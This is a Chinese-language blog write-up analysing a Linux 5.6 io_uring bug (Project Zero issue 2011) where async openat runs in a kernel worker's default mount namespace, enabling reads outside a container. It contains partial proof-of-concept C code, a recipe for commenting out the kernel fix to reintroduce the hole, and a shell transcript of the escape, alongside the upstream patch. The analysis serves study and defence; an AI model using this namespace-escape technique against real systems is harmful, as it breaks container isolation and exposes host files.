
# Linux "io_uring"  namespace 的一个问题


                                阅读量   
                                **447661**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/203112/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203112/t01983dbaeef1086525.png)](./img/203112/t01983dbaeef1086525.png)



看了jannh的[report](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011), 有点迷迷糊糊的，于是跟着分析了一波。之前也分析过 io_uring 一个权限问题，io_uring代码还在频繁的更新，期间肯定会出现各种各样的安全问题，要找个时间研究一波hh.



## 环境配置

以下所有的分析都是在 ubuntu 18.04 虚拟机下，使用的是[linux-5.6](https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.6.tar.xz) 版本的内核，可以在[github](https://github.com/rtfingc/cve-repo/tree/master/0x02-p0-issue-2011-io_uring_namespace)上找到我的环境



## 漏洞分析

这个洞其实就是没有做好namespace的检查，最后导致可以读取其他namespace的文件，这放到容器里那就是逃逸了。这里从代码的层面看看究竟发生了什么。

### <a class="reference-link" name="poc"></a>poc

可以在[这里](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011) 找到jannh 的poc,

```
int main(void) {
  // initialize uring
  struct io_uring_params params = { };
  int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &amp;params));
  unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
  unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
  struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

  // execute openat via uring
  sqes[0] = (struct io_uring_sqe) {
    .opcode = IORING_OP_OPENAT,
    .flags = IOSQE_ASYNC,
    .fd = open("/", O_RDONLY),
    .addr = (unsigned long)"/",
    .open_flags = O_PATH | O_DIRECTORY
  };
   ((int*)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int*)(sq_ring + params.sq_off.tail))++;
  int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
```

主要看传入的 `sqes` 部分， 传入的opcode是`IORING_OP_OPENAT`, `IOSQE_ASYNC` 表示用异步的方式，打开的是`"/"` 目录

因为这里使用的内核是已经打上了补丁了，为了测试漏洞，我们需要手动patch一下，找到`fs/io_uring.c` 文件, 按照下面把对 fs的检查注释掉。

```
static inline void io_req_work_grab_env(struct io_kiocb *req,    
                    const struct io_op_def *def)                 
{                                                                
    if (!req-&gt;work.mm &amp;&amp; def-&gt;needs_mm) {                        
        mmgrab(current-&gt;mm);                                     
        req-&gt;work.mm = current-&gt;mm;                              
    }                                                            
    if (!req-&gt;work.creds)                                        
        req-&gt;work.creds = get_current_cred();                    
    /*if (!req-&gt;work.fs &amp;&amp; def-&gt;needs_fs) {*/                    
        /*spin_lock(&amp;current-&gt;fs-&gt;lock);*/                       
        /*if (!current-&gt;fs-&gt;in_exec) {*/                         
            /*req-&gt;work.fs = current-&gt;fs;*/                      
            /*req-&gt;work.fs-&gt;users++;*/                           
        /*} else {*/                                             
            /*req-&gt;work.flags |= IO_WQ_WORK_CANCEL;*/            
        /*}*/                                                    
        /*spin_unlock(&amp;current-&gt;fs-&gt;lock);*/                     
    /*}*/                                                        
    if (!req-&gt;work.task_pid)                                     
        req-&gt;work.task_pid = task_pid_vnr(current);              
}                                                                
static inline void io_req_work_drop_env(struct io_kiocb *req)     
{                                                                 
    if (req-&gt;work.mm) {                                           
        mmdrop(req-&gt;work.mm);                                     
        req-&gt;work.mm = NULL;                                      
    }                                                             
    if (req-&gt;work.creds) {                                        
        put_cred(req-&gt;work.creds);                                
        req-&gt;work.creds = NULL;                                   
    }                                                             
    /*if (req-&gt;work.fs) {*/                                       
        /*struct fs_struct *fs = req-&gt;work.fs;*/                  

        /*spin_lock(&amp;req-&gt;work.fs-&gt;lock);*/                       
        /*if (--fs-&gt;users)*/                                      
            /*fs = NULL;*/                                        
        /*spin_unlock(&amp;req-&gt;work.fs-&gt;lock);*/                     
        /*if (fs)*/                                               
            /*free_fs_struct(fs);*/                               
    /*}*/                                                         
}
```

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>代码分析

`SYS_io_uring_enter` 之后的调用链如下

```
__do_sys_io_uring_enter
    - io_submit_sqes
        - io_submit_sqe
            - io_queue_sqe
                - io_req_defer_prep //&lt;--
                    - io_req_work_grab_env
```

`io_req_defer_prep` 函对传入的各种opcode做switch， 我们传入的是`IORING_OP_OPENAT`, 对应调用`io_openat_prep`

```
break;                                       
  case IORING_OP_LINK_TIMEOUT:                     
      ret = io_timeout_prep(req, sqe, true);       
      break;                                       
  case IORING_OP_ACCEPT:                           
      ret = io_accept_prep(req, sqe);              
      break;                                       
  case IORING_OP_FALLOCATE:                        
      ret = io_fallocate_prep(req, sqe);           
      break;                                       
  case IORING_OP_OPENAT:    // &lt;-------------------------------                       
      ret = io_openat_prep(req, sqe);              
      break;                                       
  case IORING_OP_CLOSE:                            
      ret = io_close_prep(req, sqe);               
      break;                                       
  case IORING_OP_FILES_UPDATE:                     
      ret = io_files_update_prep(req, sqe);
```

`io_openat_prep` 主要是把sqes 的东西拿出来保存好, `io_req_defer_prep` 执行完之后会调用`io_queue_async_work(req)`

```
static int io_openat_prep(struct io_kiocb *req, const struct io_uring_sqe *sqe)     
{                                                                                   
    const char __user *fname;                                                       
    int ret;                                                                        

    if (sqe-&gt;ioprio || sqe-&gt;buf_index)                                              
        return -EINVAL;                                                             
    if (sqe-&gt;flags &amp; IOSQE_FIXED_FILE)                                              
        return -EBADF;                                                              
    if (req-&gt;flags &amp; REQ_F_NEED_CLEANUP)                                            
        return 0;                                                                   

    req-&gt;open.dfd = READ_ONCE(sqe-&gt;fd);                                             
    req-&gt;open.how.mode = READ_ONCE(sqe-&gt;len);                                       
    fname = u64_to_user_ptr(READ_ONCE(sqe-&gt;addr));                                  
    req-&gt;open.how.flags = READ_ONCE(sqe-&gt;open_flags);                               

    req-&gt;open.filename = getname(fname);                                            
    if (IS_ERR(req-&gt;open.filename)) {                                               
        ret = PTR_ERR(req-&gt;open.filename);                                          
        req-&gt;open.filename = NULL;                                                  
        return ret;                                                                 
    }                                                                               

    req-&gt;open.nofile = rlimit(RLIMIT_NOFILE);                                       
    req-&gt;flags |= REQ_F_NEED_CLEANUP;                                               
    return 0;                                                                       
}
```

`io_queue_async_work` 把`req-&gt;work` 加入到 work queue, 之后会启动一个内核线程来执行这个work

```
static inline void io_queue_async_work(struct io_kiocb *req)          
{                                                                     
    struct io_ring_ctx *ctx = req-&gt;ctx;                               
    struct io_kiocb *link;                                            
    bool do_hashed;                                                   

    do_hashed = io_prep_async_work(req, &amp;link);                       

    trace_io_uring_queue_async_work(ctx, do_hashed, req, &amp;req-&gt;work,  
                    req-&gt;flags);                                      
    if (!do_hashed) {                                                 
        io_wq_enqueue(ctx-&gt;io_wq, &amp;req-&gt;work);                        
    } else {                                                          
        io_wq_enqueue_hashed(ctx-&gt;io_wq, &amp;req-&gt;work,                  
                    file_inode(req-&gt;file));                           
    }                                                                 

    if (link)                                                         
        io_queue_linked_timeout(link);                                
}
```

实际调试看看，在[`fs/io_uring.c:912`](https://elixir.bootlin.com/linux/v5.6/source/fs/io_uring.c#L912) 处下个断点

```
gef➤  info args
req = 0xffff88800d042c00
sqe = 0xffff88800d0c8000
gef➤  p *req
$1 = {
  {
    file = 0xffff88800eec4800,
//....
open = {
  file = 0xffff88800eec4800,
  dfd = 0x0,
  {
    mask = 0x0
  },
  filename = 0x0 &lt;fixed_percpu_data&gt;,
  buffer = 0x0 &lt;fixed_percpu_data&gt;,
  how = {
    flags = 0x0,
    mode = 0x0,
    resolve = 0x0
  },
  nofile = 0x0
},
//..
  work = {
    {
      list = {
        next = 0x0 &lt;fixed_percpu_data&gt;
      },
      data = 0x0 &lt;fixed_percpu_data&gt;
    },
    func = 0xffffffff81354760 &lt;io_wq_submit_work&gt;,// &lt;===
    files = 0xffff88800ed90580,
    mm = 0x0 &lt;fixed_percpu_data&gt;,
    creds = 0x0 &lt;fixed_percpu_data&gt;,
    fs = 0x0 &lt;fixed_percpu_data&gt;,
    flags = 0x0,
    task_pid = 0x0
  }
}
```

在work字段里对应的是`io_wq_submit_work` 函数，进入到这个函数，已经是内核线程了，我们可以下个断点看看

```
gef➤  bt
#0  io_wq_submit_work (workptr=0xffffc90000277e88) at fs/io_uring.c:4522
#1  0xffffffff81356bba in io_worker_handle_work (worker=0xffff88800e08df00) at fs/io-wq.c:511
#2  0xffffffff81357679 in io_wqe_worker (data=0xffff88800e08df00) at fs/io-wq.c:552
#3  0xffffffff810c0fe1 in kthread (_create=0xffff88800d066b00) at kernel/kthread.c:255
#4  0xffffffff81c00215 in ret_from_fork () at arch/x86/entry/entry_64.S:352
#5  0x0000000000000000 in ?? ()
gef➤  kcurrent
smp system (__per_cpu_offset) 0xffffffff8245c920
cpu_num 0x1
swapper_pgd 0x0
cpu #0 : 0xffff88800f200000
    current_task: 0xffff88800eee1600  :io_wqe_worker-0
        uid: 0x0   gid: 0x0  :cred 0xffff88800eec2540
        mm: 0x0
        pgd: 0x0

```

最后会进入`io_issue_sqe`函数，然后根据传进来的opcode做switch, 在内核线程里调用`io_openat`。

```
case IORING_OP_OPENAT:                           
        if (sqe) {                                   
            ret = io_openat_prep(req, sqe);          
            if (ret)                                 
                break;                               
        }                                            
        ret = io_openat(req, nxt, force_nonblock);
```

接着调用`do_filp_open` 来打开文件返回文件描述符。貌似没有什么问题呀，正常的调用openat， 正常的打开文件或文件夹。

这是应用场景的不同，这里出现漏洞的原因是它没有对不同的namespace做区分，namespace是linux对系统资源的一种隔离机制，我们熟悉的docker就有用到namespace的东西，namespace相关的东西可以参考[这篇文章](https://segmentfault.com/a/1190000009732550),写的真棒，这里不做过多的描述。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95"></a>利用测试

完整的利用流程如下

```
/home/pwn # echo aaaa &gt; /tmp/real
/home/pwn # echo $$
206
/home/pwn # ls -al /proc/$$/ns |grep mnt
lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -&gt; mnt:[4026531840]
/home/pwn # pstree -p |grep sh
init(1)---rcS(171)---sh(206)-+-grep(212)
/home/pwn # unshare -m --uts /bin/sh
/bin/sh: can't access tty; job control turned off
/home/pwn # echo $$
213
/home/pwn # pstree -p |grep sh
init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
/home/pwn # ls -al /proc/$$/ns |grep mnt
lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -&gt; mnt:[4026532131]
/home/pwn # mount -t tmpfs none /tmp
/home/pwn # ls /tmp
/home/pwn # /exp
submitted 1, getevents done
cq_tail = 1
result: 5
launching shell
sh: can't access tty; job control turned off
/home/pwn # echo $$
223
/home/pwn # pstree -p |grep sh
init(1)---rcS(171)---sh(206)---sh(213)---exp(220)---sh(223)-+-grep(225)
/home/pwn # ls -al /proc/$$/ns |grep mnt
lrwxrwxrwx    1 root     0                0 Apr 15 02:57 mnt -&gt; mnt:[4026532131]
/home/pwn # ls -al /proc/$$/fd/
total 0
dr-x------    2 root     0                0 Apr 15 02:58 .
dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
lrwx------    1 root     0               64 Apr 15 02:58 0 -&gt; /dev/console
lrwx------    1 root     0               64 Apr 15 02:58 1 -&gt; /dev/console
lrwx------    1 root     0               64 Apr 15 02:58 2 -&gt; /dev/console
lr-x------    1 root     0               64 Apr 15 02:58 4 -&gt; /
l---------    1 root     0               64 Apr 15 02:58 5 -&gt; /
/home/pwn # cat /proc/$$/fd/5/tmp/real
aaaa
/home/pwn # C#
```

首先创建一个 `/tmp/real` 文件，写入`aaaa`, 看一下当前shell的 mount namespace， 记住他的id为`4026531840`,

```
/home/pwn # echo aaaa &gt; /tmp/real
/home/pwn # echo $$
206
/home/pwn # ls -al /proc/$$/ns |grep mnt
lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -&gt; mnt:[4026531840]
/home/pwn # pstree -p |grep sh
init(1)---rcS(171)---sh(206)-+-grep(212)
```

接着用 `unshare` 创建一个新的 mount namespace, 然后mount 上 tmpfs, 可以看到namespace的 id是`4026532131`，和原来的不同， 这个时候就看不到原来namespace的目录下的东西了(想一下docker的隔离),

```
/home/pwn # unshare -m --uts /bin/sh
/bin/sh: can't access tty; job control turned off
/home/pwn # echo $$
213
/home/pwn # pstree -p |grep sh
init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
/home/pwn # ls -al /proc/$$/ns |grep mnt
lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -&gt; mnt:[4026532131]
/home/pwn # mount -t tmpfs none /tmp
/home/pwn # ls /tmp
```

接着运行 exp， 它会打开`/` 目录，返回的`fd`是 5

```
/home/pwn # /exp
submitted 1, getevents done
cq_tail = 1
result: 5
launching shell
sh: can't access tty; job control turned off
/home/pwn # echo $$
223
/home/pwn # ls -al /proc/$$/fd/
total 0
dr-x------    2 root     0                0 Apr 15 02:58 .
dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
lrwx------    1 root     0               64 Apr 15 02:58 0 -&gt; /dev/console
lrwx------    1 root     0               64 Apr 15 02:58 1 -&gt; /dev/console
lrwx------    1 root     0               64 Apr 15 02:58 2 -&gt; /dev/console
lr-x------    1 root     0               64 Apr 15 02:58 4 -&gt; /
l---------    1 root     0               64 Apr 15 02:58 5 -&gt; /
/home/pwn # cat /proc/$$/fd/5/tmp/real
aaaa
```

进去看一下可以发现这里打开的是原来namespace的`"/"` 目录。

linux 默认情况下所有的进程都会有一个系统默认的namespace, 也就是说本身linux就是一个最初的容器，我们新的namespace只是在最初的容器下创建一个新容器罢了。

从前面的分析我们知道，最后由于是异步的调用，会在内核线程`io_wqe_worker-0` 里调用 `do_filp_open` `来打开目录， 所有的内核线程都继承自`kthreadd` 线程，使用的是默认的mount namespace

```
gef➤  kcurrent                                           
smp system (__per_cpu_offset) 0xffffffff8245c920         
cpu_num 0x1                                              
swapper_pgd 0x0                                          
cpu #0 : 0xffff88800f200000                              
    current_task: 0xffff88800d080000  :io_wqe_worker-0   
        uid: 0x0   gid: 0x0  :cred 0xffff88800eec2840    
        mm: 0x0                                          
        pgd: 0x0                                         
gef➤  kproc                                                     
0x1  :init            :  uid: 0  task: 0xffff88800ed88000
0x2  :kthreadd        :  uid: 0  task: 0xffff88800ed89600
0x3  :rcu_gp          :  uid: 0  task: 0xffff88800ed8ac00
//...
0xcf :sh              :  uid: 0  task: 0xffff88800d085800
0xd2 :exp             :  uid: 0  task: 0xffff88800d084200//
0xd3 :io_wq_manager   :  uid: 0  task: 0xffff88800d081600
0xd4 :io_wqe_worker-0 :  uid: 0  task: 0xffff88800d080000//

```

我们看一下他们的namespace

```
gef➤  p *((struct task_struct *)0xffff88800d084200)-&gt;nsproxy // exp  进程
$1 = {
  count = {
    counter = 0x2
  },
  uts_ns = 0xffffffff82613620 &lt;init_uts_ns&gt;,
  ipc_ns = 0xffffffff8273c7c0 &lt;init_ipc_ns&gt;,
  mnt_ns = 0xffff88800d6ece80,
  pid_ns_for_children = 0xffffffff8265f7e0 &lt;init_pid_ns&gt;,
  net_ns = 0xffffffff827f5ec0 &lt;init_net&gt;,
  time_ns = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  time_ns_for_children = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  cgroup_ns = 0xffffffff826c1780 &lt;init_cgroup_ns&gt;
}
gef➤  p *((struct task_struct *)0xffff88800ed89600)-&gt;nsproxy//kthreadd
$3 = {
  count = {
    counter = 0x35
  },
  uts_ns = 0xffffffff82613620 &lt;init_uts_ns&gt;,
  ipc_ns = 0xffffffff8273c7c0 &lt;init_ipc_ns&gt;,
  mnt_ns = 0xffff88800ec65680,
  pid_ns_for_children = 0xffffffff8265f7e0 &lt;init_pid_ns&gt;,
  net_ns = 0xffffffff827f5ec0 &lt;init_net&gt;,
  time_ns = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  time_ns_for_children = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  cgroup_ns = 0xffffffff826c1780 &lt;init_cgroup_ns&gt;
}

gef➤  p *((struct task_struct *)0xffff88800d080000)-&gt;nsproxy//io_wqe_worker-0
$2 = {
  count = {
    counter = 0x35
  },
  uts_ns = 0xffffffff82613620 &lt;init_uts_ns&gt;,
  ipc_ns = 0xffffffff8273c7c0 &lt;init_ipc_ns&gt;,
  mnt_ns = 0xffff88800ec65680,
  pid_ns_for_children = 0xffffffff8265f7e0 &lt;init_pid_ns&gt;,
  net_ns = 0xffffffff827f5ec0 &lt;init_net&gt;,
  time_ns = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  time_ns_for_children = 0xffffffff826bc940 &lt;init_time_ns&gt;,
  cgroup_ns = 0xffffffff826c1780 &lt;init_cgroup_ns&gt;
}
gef➤
```

可以看到，`io_wqe_worker-0` 的`mnt_ns` 地址是`0xffff88800ec65680` ，和默认值一样，因为exp是运行在新的namespace下，它的`mnt_ns=0xffff88800d6ece80`，整理一下
- 1 exp 运行（`mnt_ns=0xffff88800d6ece80`)
<li>2 io_uring 启动内核线程 openat, 内核线程`io_wqe_worker-0` 使用默认的`mnt_ns`
</li>
于是`io_wqe_worker-0` 看到的是一开始的mount namespace, 打开的也是原来namespace的`"/"` 目录，于是我们就可以通过这个fd来任意读里面的内容啦。

### <a class="reference-link" name="%E8%A1%A5%E4%B8%81"></a>补丁

给出的[补丁](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c) 如下, 添加了`fs` 字段，然后 启动内核线程前把 exp 的 fs 保存到 `req-&gt;work.fs` 里面

```
@@ -907,6 +915,16 @@ static inline void io_req_work_grab_env(struct io_kiocb *req,
     }
     if (!req-&gt;work.creds)
         req-&gt;work.creds = get_current_cred();
+    if (!req-&gt;work.fs &amp;&amp; def-&gt;needs_fs) {
+        spin_lock(&amp;current-&gt;fs-&gt;lock);
+        if (!current-&gt;fs-&gt;in_exec) {
+            req-&gt;work.fs = current-&gt;fs;
+            req-&gt;work.fs-&gt;users++;
+        } else {
+            req-&gt;work.flags |= IO_WQ_WORK_CANCEL;
+        }
+        spin_unlock(&amp;current-&gt;fs-&gt;lock);
+    }
 }

 static inline void io_req_work_drop_env(struct io_kiocb *req)
@@ -919,6 +937,16 @@ static inline void io_req_work_drop_env(struct io_kiocb *req)
         put_cred(req-&gt;work.creds);
         req-&gt;work.creds = NULL;
     }
+    if (req-&gt;work.fs) {
+        struct fs_struct *fs = req-&gt;work.fs;
+
+        spin_lock(&amp;req-&gt;work.fs-&gt;lock);
+        if (--fs-&gt;users)
+            fs = NULL;
+        spin_unlock(&amp;req-&gt;work.fs-&gt;lock);
+        if (fs)
+            free_fs_struct(fs);
+    }
 }
```

然后再在内核线程里面检查一致性。

```
if (work-&gt;fs &amp;&amp; current-&gt;fs != work-&gt;fs)     
    current-&gt;fs = work-&gt;fs;
```



## 小结

总的来说这里和之前[cve-2019-19241](https://www.anquanke.com/post/id/200486),差不多，都是因为在内核线程里面没有做好检查，然后可以做一些不可描述的事情，漏洞本身其实也不能说是漏洞，就是忘了检查…通过这个issue学习了一波namespace和cgroup的东西，满足:P.



## reference

[https://bugs.chromium.org/p/project-zero/issues/detail?id=2011](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011)

https://lore.kernel.org/io-uring/20200207155039.12819-1-axboe@kernel.dk/T/

https://lore.kernel.org/io-uring/20200207155039.12819-1-axboe@kernel.dk/T/

[https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c)

[https://segmentfault.com/a/1190000009732550](https://segmentfault.com/a/1190000009732550)
